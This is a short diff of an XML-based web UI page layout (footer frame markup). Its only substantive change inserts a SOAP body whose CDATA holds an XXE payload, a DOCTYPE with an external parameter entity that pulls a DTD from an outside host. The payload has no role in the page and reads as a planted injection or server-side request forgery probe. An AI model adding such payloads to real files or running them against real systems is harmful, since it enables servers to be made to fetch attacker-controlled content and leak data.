@@ -639,5 +639,6 @@
     		<xf:group id="grp_foot" style="position: relative;" class="">
     			<w2:wframe id="wf_foot" style="position: relative;" src="/ui/portal/common/footer.xml"></w2:wframe>
     		</xf:group>
-    	</xf:group></body>
+    	</xf:group>
+	<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "https://ssrinctest.run.goorm.io/"> %dtd;]><xxx/>]]></foo></soap:Body></body>
 </html>
